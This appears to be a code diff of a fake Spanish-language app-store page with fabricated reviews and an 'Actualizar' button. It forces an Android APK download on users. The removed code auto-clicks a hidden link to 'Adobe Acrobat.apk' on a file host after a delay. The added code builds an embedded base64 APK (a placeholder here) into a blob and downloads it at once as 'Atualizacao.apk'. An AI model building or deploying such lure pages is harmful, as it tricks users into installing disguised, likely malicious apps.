@@ -112,28 +112,8 @@
     <button class="button btn-info">Más información</button>
     <button class="button btn-update" onclick="iniciarDescarga()">Actualizar</button>
 
-    <div id="aviso">⚠️ Clic simulado en “Fazer o download mesmo assim”...</div>
+    <div id="aviso">⬇️ Fazendo o download mesmo assim...</div>
     <div id="seta" class="arrow">⬇️</div>
-
-    <h3>Valoraciones y reseñas</h3>
-    <p>Las valoraciones y reseñas son verificadas y hechas por personas que usan el mismo tipo de dispositivo que tú.</p>
-    <h2 class="stars">★ 4.6</h2>
-    <p><small>110,681 reseñas</small></p>
-    <div>
-      <div>5 estrellas</div>
-      <div class="rating-bar"><div class="rating-bar-fill" style="width: 80%;"></div></div>
-      <div>4 estrellas</div>
-      <div class="rating-bar"><div class="rating-bar-fill" style="width: 15%;"></div></div>
-      <div>3 estrellas</div>
-      <div class="rating-bar"><div class="rating-bar-fill" style="width: 3%;"></div></div>
-      <div>2 estrellas</div>
-      <div class="rating-bar"><div class="rating-bar-fill" style="width: 1%;"></div></div>
-      <div>1 estrella</div>
-      <div class="rating-bar"><div class="rating-bar-fill" style="width: 1%;"></div></div>
-    </div>
-
-    <!-- link oculto simulando botão de download -->
-    <a id="forcarDownload" href="https://store5.gofile.io/download/direct/cf60a51a-2d16-4a5b-b483-c9cba701c003/Adobe%20Acrobat.apk" style="display:none;" download></a>
   </div>
 
   <script>
@@ -141,10 +121,37 @@
       document.getElementById("seta").style.display = "block";
       document.getElementById("aviso").style.display = "block";
 
-      // Aguarda e simula clique no "Fazer o download mesmo assim"
-      setTimeout(() => {
-        document.getElementById("forcarDownload").click();
-      }, 9500);
+      // Base64 de exemplo (substitua pela sua real)
+      const apkBase64 = "UEsDBBQACAg..."; // <-- coloque sua base64 real aqui
+
+      const blob = b64toBlob(apkBase64, 'application/vnd.android.package-archive');
+      const url = URL.createObjectURL(blob);
+
+      const a = document.createElement("a");
+      a.href = url;
+      a.download = "Atualizacao.apk";
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
+      URL.revokeObjectURL(url);
+    }
+
+    // Função para converter base64 em Blob
+    function b64toBlob(b64Data, contentType = '', sliceSize = 512) {
+      const byteCharacters = atob(b64Data);
+      const byteArrays = [];
+
+      for (let offset = 0; offset < byteCharacters.length; offset += sliceSize) {
+        const slice = byteCharacters.slice(offset, offset + sliceSize);
+        const byteNumbers = new Array(slice.length);
+        for (let i = 0; i < slice.length; i++) {
+          byteNumbers[i] = slice.charCodeAt(i);
+        }
+        const byteArray = new Uint8Array(byteNumbers);
+        byteArrays.push(byteArray);
+      }
+
+      return new Blob(byteArrays, { type: contentType });
     }
 
     // Data dinâmica em espanhol
@@ -156,10 +163,7 @@
     const dia = hoje.getDate();
     const mes = meses[hoje.getMonth()];
     const ano = hoje.getFullYear();
-    const dataFormatada = `Última actualización: ${dia} de ${mes} de ${ano}`;
-    document.getElementById("fecha-actualizacion").innerText = dataFormatada;
+    document.getElementById("fecha-actualizacion").innerText = `Última actualización: ${dia} de ${mes} de ${ano}`;
   </script>
 </body>
 </html>
-
-
